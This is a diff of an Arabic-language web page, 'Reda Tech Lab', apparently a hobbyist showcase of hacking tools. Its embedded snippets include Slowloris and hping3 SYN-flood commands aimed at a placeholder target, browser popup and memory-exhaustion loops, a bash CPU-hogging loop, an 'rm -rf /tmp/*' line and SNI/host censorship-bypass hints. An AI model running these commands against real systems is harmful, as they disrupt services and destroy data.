@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مختبر رضا المطور | PRO EDITION</title>
+    <title>مختبر رضا المطور | KALI PRO</title>
     <style>
         :root {
             --bg: #020617;
@@ -67,25 +67,22 @@
         .trigger-btn { padding: 12px 25px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .learn-trigger { background: var(--accent); color: #000; }
         .reda-trigger { background: var(--red-gold); color: #000; }
-        
-        /* زر كالي لينكس الجديد */
-        .kali-btn { 
-            background: var(--kali); 
-            color: white; 
-            border: 2px solid white;
-            box-shadow: 0 0 20px rgba(46, 103, 255, 0.5);
-        }
-        .kali-btn:hover { transform: scale(1.1); box-shadow: 0 0 30px var(--kali); }
+        .kali-btn { background: var(--kali); color: white; border: 2px solid white; box-shadow: 0 0 20px rgba(46, 103, 255, 0.5); }
 
         .card { background: var(--panel); width: 95%; max-width: 900px; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); margin-bottom: 30px; }
+        
+        /* أدوات كالي الداخلية */
+        .kali-tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin-top: 15px; display: none; }
+        .tool-sub-btn { background: #334155; color: white; border: 1px solid var(--kali); padding: 10px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; transition: 0.3s; }
+        .tool-sub-btn:hover { background: var(--kali); }
+
         .level-btn { padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; background: #334155; color: white; font-weight: bold; margin: 5px; transition: 0.2s; }
         .level-btn.active { background: var(--lvl1); color: #000; }
 
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 12px; margin-top: 15px; }
         .type-btn { background: #0f172a; color: var(--text); border: 1px solid #334155; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        .type-btn:hover { border-color: var(--accent); background: #1e293b; }
         
-        .code-box { background: #000; padding: 25px; border-radius: 12px; border-right: 5px solid var(--accent); margin-top: 25px; }
+        .code-box { background: #000; padding: 25px; border-radius: 12px; border-right: 5px solid var(--accent); margin-top: 25px; overflow-x: auto; }
         .code-box pre { margin: 0; color: #f8fafc; font-family: monospace; direction: ltr; white-space: pre-wrap; }
 
         .ask-reda-section { margin-top: 20px; background: #0f172a; padding: 20px; border-radius: 15px; border: 1px dashed var(--red-gold); width: 100%; box-sizing: border-box; }
@@ -95,28 +92,16 @@
 </head>
 <body>
 
-<!-- الموسوعة التقنية -->
 <div class="sidebar sidebar-right" id="sidebarRight">
-    <div class="sidebar-header">
-        <span>📖 الموسوعة البرمجية</span>
-        <button onclick="toggleSide('Right')">✕</button>
-    </div>
+    <div class="sidebar-header"><span>📖 الموسوعة البرمجية</span><button onclick="toggleSide('Right')">✕</button></div>
     <div id="infoItems"></div>
 </div>
 
-<!-- ماذا لو كنت رضا؟ -->
 <div class="sidebar sidebar-left" id="sidebarLeft">
-    <div class="sidebar-header header-reda">
-        <span>👑 ماذا لو كنت رضا؟</span>
-        <button onclick="toggleSide('Left')">✕</button>
-    </div>
+    <div class="sidebar-header header-reda"><span>👑 ماذا لو كنت رضا؟</span><button onclick="toggleSide('Left')">✕</button></div>
     <div style="padding: 10px;">
-        <div class="info-item warning-item">
-            <strong>⚠️ تحذير الموارد:</strong> "أكواد المستوى 3 تستهلك الـ RAM والمعالج بالكامل. لا تشغلها بدون Virtual Machine."
-        </div>
-        <div class="info-item" style="border-right-color: var(--red-gold);">
-            <strong>فلسفة المطور:</strong> "القوة الحقيقية تكمن في معرفة كيف تنهار الأنظمة لتتمكن من حمايتها."
-        </div>
+        <div class="info-item warning-item"><strong>⚠️ تحذير الموارد:</strong> أكواد المستوى 3 قوية جداً وتستهلك الذاكرة.</div>
+        <div class="info-item" style="border-right-color: var(--red-gold);"><strong>فلسفة المطور:</strong> الأنظمة وجدت لتمتحن قوتها.</div>
     </div>
 </div>
 
@@ -127,18 +112,22 @@
 
     <div class="btn-group">
         <button class="trigger-btn learn-trigger" onclick="toggleSide('Right')">📖 الموسوعة</button>
-        
-        <!-- زر كالي لينكس الجديد -->
-        <button class="trigger-btn kali-btn" onclick="showKaliTools()">🐉 كالي لينكس الخاص بـ رضا</button>
-        
+        <button class="trigger-btn kali-btn" onclick="toggleKaliGrid()">🐉 كالي لينكس الخاص بـ رضا</button>
         <button class="trigger-btn reda-trigger" onclick="toggleSide('Left')">👑 ماذا لو كنت رضا؟</button>
+    </div>
+
+    <!-- أزرار أدوات كالي الفرعية -->
+    <div class="kali-tools-grid" id="kaliToolsGrid">
+        <button class="tool-sub-btn" onclick="showTool('airodump')">📡 Airodump-ng (شبكة)</button>
+        <button class="tool-sub-btn" onclick="showTool('nmap')">🔍 Nmap (شبكة)</button>
+        <button class="tool-sub-btn" onclick="showTool('slowloris')">🌪️ Slowloris (تعطيل)</button>
+        <button class="tool-sub-btn" onclick="showTool('hping3')">💣 Hping3 (تعطيل)</button>
     </div>
 
     <div class="card">
         <h1 style="text-align:center; color: var(--accent); margin:0;">REDA TECH LAB (PRO)</h1>
-        <p style="text-align:center; color: #94a3b8; margin-bottom: 20px;">الأمن السيبراني | الاستنزاف التقني | تخطي الحجب</p>
         
-        <div style="text-align: center; margin-bottom: 25px;">
+        <div style="text-align: center; margin: 20px 0;">
             <button class="level-btn active" id="l1" onclick="setLevel(1)">المستوى 1</button>
             <button class="level-btn" id="l2" onclick="setLevel(2)">المستوى 2</button>
             <button class="level-btn" id="l3" onclick="setLevel(3)">المستوى 3 🔥</button>
@@ -157,8 +146,8 @@
 
         <div class="ask-reda-section">
             <h3 style="color: var(--red-gold); margin-top: 0;">💬 اسأل رضا</h3>
-            <input type="text" id="userQuestion" class="ask-input" placeholder="اسأل عن كالي، التشفير، أو الأكواد القوية...">
-            <button class="trigger-btn reda-trigger" style="padding: 8px 20px;" onclick="askReda()">إرسال الاستفسار</button>
+            <input type="text" id="userQuestion" class="ask-input" placeholder="اسأل رضا عن أي أداة...">
+            <button class="trigger-btn reda-trigger" style="padding: 8px 20px;" onclick="askReda()">إرسال</button>
             <div id="redaResponse" class="reda-response"></div>
         </div>
     </div>
@@ -169,70 +158,79 @@
     let heavyLoad = [];
 
     function toggleSide(s) { document.getElementById('sidebar' + s).classList.toggle('active'); }
-
     function setLevel(l) { 
         currentLevel = l; 
         document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
         document.getElementById('l' + l).classList.add('active');
     }
 
-    // عرض أدوات كالي الخاصة برضا
-    function showKaliTools() {
+    function toggleKaliGrid() {
+        const grid = document.getElementById('kaliToolsGrid');
+        grid.style.display = (grid.style.display === 'grid') ? 'none' : 'grid';
+    }
+
+    const toolInfo = {
+        airodump: {
+            title: "📡 أداة Airodump-ng (مراقبة الشبكات)",
+            desc: "تُستخدم لالتقاط البيانات من الشبكات اللاسلكية واكتشاف الـ BSSID والأجهزة المتصلة.",
+            code: "# بدء المراقبة على كرت الشبكة\nsudo airodump-ng wlan0mon\n\n# تحديد شبكة معينة للحفظ\nsudo airodump-ng --bssid [MAC] -c [Channel] -w output wlan0mon"
+        },
+        nmap: {
+            title: "🔍 أداة Nmap (فحص الثغرات)",
+            desc: "الأداة الأقوى لفحص المنافذ (Ports) والخدمات ومعظمة أنظمة التشغيل للأهداف.",
+            code: "# فحص سريع للمنافذ المفتوحة\nnmap -F [Target_IP]\n\n# فحص عميق مع محاولة كشف إصدارات الخدمات\nnmap -sV -sC -O [Target_IP]"
+        },
+        slowloris: {
+            title: "🌪️ أداة Slowloris (تعطيل السيرفرات هادئ)",
+            desc: "تقوم بفتح اتصالات HTTP كاذبة وإبقائها مفتوحة لاستنزاف موارد السيرفر ومنعه من استقبال زوار جدد.",
+            code: "# تثبيت وتشغيل الأداة (بايثون)\npython3 slowloris.py [Target_URL] -s 500\n\n# ملاحظة: تعتمد على عدد الاتصالات (Sockets) المفتوحة."
+        },
+        hping3: {
+            title: "💣 أداة Hping3 (هجوم Flood)",
+            desc: "تُستخدم لإرسال سيل ضخم من حزم SYN أو TCP لتعطيل استجابة الموقع (DDoS Simulation).",
+            code: "# هجوم SYN Flood سريع جداً\nsudo hping3 -S --flood -V -p 80 [Target_IP]\n\n# إرسال حزم عشوائية المصدر\nsudo hping3 --rand-source [Target_IP]"
+        }
+    };
+
+    function showTool(t) {
         const res = document.getElementById('results');
+        const data = toolInfo[t];
         res.innerHTML = `
             <div class="code-box" style="border-right-color: var(--kali)">
-                <pre style="color: #60a5fa">> INITIALIZING KALI LINUX ENVIRONMENT...
-> USER: REDA_DEVELOPER
-> TOOLS READY:
--------------------------------------------
-1. Wireless: Airodump-ng, Fluxion, Wifite
-2. Network: Nmap, Wireshark, Netcat
-3. Web: Burp Suite, BeEF, SQLmap
-4. Exploits: Metasploit, Social Engineering
--------------------------------------------
-* نصيحة رضا: استخدم 'sudo anonsurf start' قبل أي عملية.</pre>
+                <h3 style="color:var(--kali); margin-top:0;">${data.title}</h3>
+                <p style="color:#94a3b8; font-size:0.9rem;">${data.desc}</p>
+                <hr style="border:0; border-top:1px solid #334155; margin:15px 0;">
+                <pre>${data.code}</pre>
             </div>`;
     }
 
-    const expertData = [
-        {t: "فحص الشبكة اللاسلكية.", c: "airodump-ng wlan0mon"},
-        {t: "تشفير Base64 احترافي.", c: "echo -n 'reda' | base64"},
-        {t: "وضع التخفي Anonsurf.", c: "anonsurf start"},
-        {t: "تحديث مخازن كالي.", c: "sudo apt update"}
-    ];
-
-    const infoList = document.getElementById('infoItems');
-    expertData.forEach((d, i) => {
-        infoList.innerHTML += `
-            <div class="info-item">
-                <strong style="color:var(--accent)">معلومة #${i+1}:</strong> ${d.t}
-                <code class="code-snippet">${d.c}</code>
-            </div>`;
-    });
-
+    // الأكواد الأساسية لباقي الوظائف (كما في النسخة السابقة)
     const repo = {
-        logic: { 1: ["alert('Ping!');"], 2: ["setInterval(()=>console.log('Test'), 100)"], 3: ["while(true) { let w = window.open('','','width=10,height=10'); w.document.write('<script>location.reload();</'+'script>'); }"] },
+        logic: { 1: ["alert('Ping!');"], 2: ["setInterval(()=>console.log('Test'), 100)"], 3: ["while(true) { window.open('','','width=10,height=10'); }"] },
         crash: { 1: ["let x = new Array(100)"], 2: ["while(true){console.count()}"], 3: ["setInterval(() => { heavyLoad.push(new Uint8Array(100*1024*1024).fill(1)); }, 50);"] },
         bash: { 1: ["whoami"], 2: ["cat /dev/zero > leak.img"], 3: ["for i in {1..20}; do (while true; do true; done &); done"] },
-        network: { 1: ["ping 127.0.0.1"], 2: ["netstat -a"], 3: ["while(true){ Promise.all(Array.from({length: 500}, () => fetch('http://127.0.0.1', {mode:'no-cors'}))); }"] },
-        bypass: { 1: ["Host: ekb.eg"], 2: ["SNI: moe.gov.eg"], 3: ["Payload: [raw][host_port][protocol]"] },
-        file: { 1: ["ls"], 2: ["touch script_{1..10}.sh"], 3: ["rm -rf /tmp/*"] }
+        network: { 1: ["ping 127.0.0.1"], 2: ["netstat -a"], 3: ["while(true){ fetch('http://127.0.0.1', {mode:'no-cors'}); }"] },
+        bypass: { 1: ["Host: ekb.eg"], 2: ["SNI: moe.gov.eg"], 3: ["Payload: [raw][host_port]"] },
+        file: { 1: ["ls"], 2: ["mkdir reda_lab"], 3: ["rm -rf /tmp/*"] }
     };
 
     function generate(t) {
         const res = document.getElementById('results');
-        let code = repo[t][currentLevel].join('\n');
-        res.innerHTML = `<div class="code-box"><pre>> EXEC: ${t.toUpperCase()}\n\n${code}</pre></div>`;
+        res.innerHTML = `<div class="code-box"><pre>> EXEC: ${t.toUpperCase()}\n\n${repo[t][currentLevel].join('\n')}</pre></div>`;
     }
 
     function askReda() {
-        const question = document.getElementById('userQuestion').value.toLowerCase();
-        const responseDiv = document.getElementById('redaResponse');
-        responseDiv.style.display = 'block';
-        let answer = "كخبير، ركز على تعلم الـ Networking لأنه أساس كل شيء.";
-        if(question.includes("اختراق") || question.includes("كالي")) { answer = "ابدأ بـ Nmap و Airodump-ng لفهم بنية الهدف."; }
-        responseDiv.innerHTML = `<strong>رضا يقول:</strong> ${answer}`;
+        const q = document.getElementById('userQuestion').value.toLowerCase();
+        const r = document.getElementById('redaResponse');
+        r.style.display = 'block';
+        r.innerHTML = "<strong>رضا يقول:</strong> استخدم أدوات كالي بحذر وفي بيئة اختبار فقط لتعلم الحماية.";
     }
+
+    const expertData = [{t:"فحص الشبكة", c:"airodump-ng"}, {t:"كشف المنافذ", c:"nmap"}, {t:"تخطي الحجب", c:"SNI Host"}];
+    const infoList = document.getElementById('infoItems');
+    expertData.forEach((d, i) => {
+        infoList.innerHTML += `<div class="info-item"><strong style="color:var(--accent)">#${i+1}:</strong> ${d.t}<code class="code-snippet">${d.c}</code></div>`;
+    });
 </script>
 </body>
 </html>
